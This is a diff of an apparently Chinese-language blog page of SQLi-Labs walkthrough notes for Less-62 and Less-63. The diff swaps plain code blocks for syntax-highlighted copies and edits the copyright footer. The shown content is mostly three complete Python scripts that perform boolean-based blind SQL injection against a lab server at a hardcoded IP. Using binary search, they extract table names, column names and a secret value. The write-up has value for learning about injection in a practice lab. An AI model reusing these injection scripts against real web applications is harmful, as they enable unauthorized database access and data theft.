-payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36
-
-# payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62
-
-for i in range(1,11): 
-    low = 0
-    high =35
-    # high = 61
-    while high-low&gt;1:
-        mid = (high + low)//2
-        m = payloads[mid]
-        payload = f&quot;?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{m}--+&quot; 
-        r = requests.get(url+payload)
-        if &#39;Angelina&#39; in r.text:
-            low = mid
-        else:
-            high = mid
-    data += chr(payloads[high])
-    print(data)
-
-</code></pre>
+<p>（1）表名：（已测试出表名长度为10）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
 <p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726212918224.png" alt="在这里插入图片描述"></p>
-<p>（2）列名：（只爆破最后随机的4位）</p>
-<pre><code class="python">import requests
-
-url = &#39;http://43.247.91.228:84/Less-62/&#39;
-
-data = &#39;&#39;
-
-payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36
-
-# payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62
-
-for i in range(8,12): 
-    low = 0
-    high =35
-    # high = 61
-    while high-low&gt;1:
-        mid = (high + low)//2
-        m = payloads[mid]
-        # payload = f&quot;?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{m}--+&quot; 
-        payload = f&quot;?id=1&#39;) and ascii(substr((select column_name from information_schema.columns where table_name=&#39;1X6T9FDAIW&#39; limit 2,1),{i},1))&gt;{m}--+&quot; 
-        r = requests.get(url+payload)
-        if &#39;Angelina&#39; in r.text:
-            low = mid
-        else:
-            high = mid
-    data += chr(payloads[high])
-    print(data)
-
-</code></pre>
-<p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/2019072621292983.png" alt="在这里插入图片描述"><br>（3）最后的数据：（已知长度为24）</p>
-<pre><code class="python">import requests
-
-url = &#39;http://43.247.91.228:84/Less-62/&#39;
-
-data = &#39;&#39;
-
-# payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36
-
-payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62
-
-for i in range(1,25): 
-    low = 0
-    # high =35
-    high = 61
-    while high-low&gt;1:
-        mid = (high + low)//2
-        m = payloads[mid]
-        # payload = f&quot;?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{m}--+&quot; 
-        # payload = f&quot;?id=1&#39;) and ascii(substr((select column_name from information_schema.columns where table_name=&#39;1X6T9FDAIW&#39; limit 2,1),{i},1))&gt;{m}--+&quot; 
-        payload = f&quot;?id=1&#39;) and ascii(substr((select group_concat(secret_SQOB) from 1X6T9FDAIW),{i},1))&gt;{m}--+&quot; 
-        r = requests.get(url+payload)
-        if &#39;Angelina&#39; in r.text:
-            low = mid
-        else:
-            high = mid
-    data += chr(payloads[high])
-    print(data)
-
-</code></pre>
+<p>（2）列名：（只爆破最后随机的4位）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">12</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select column_name from information_schema.columns where table_name='1X6T9FDAIW' limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/2019072621292983.png" alt="在这里插入图片描述"><br>（3）最后的数据：（已知长度为24）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))+list(range(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment"># 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    <span class="comment"># high =35</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select column_name from information_schema.columns where table_name='1X6T9FDAIW' limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select group_concat(secret_SQOB) from 1X6T9FDAIW),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
 <p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726212950480.png" alt="在这里插入图片描述"><br><br></p>
 <h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>闭合方式为：<code>&#39;$id&#39;</code>，其他的与less-62相同。</p>
 <p><br></p>
@@ -874,14 +516,9 @@ for i in range(1,25):
                 
                     <p class="copyright-item">
                         <span>License:</span>
-                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                     </p>
                 
-                
-                     <p class="copyright-item">
-                         <span>Slogan:</span>
-                         <span>Do you believe in <strong>DESTINY</strong>?</span>
-                     </p>
                 
 
             </section>
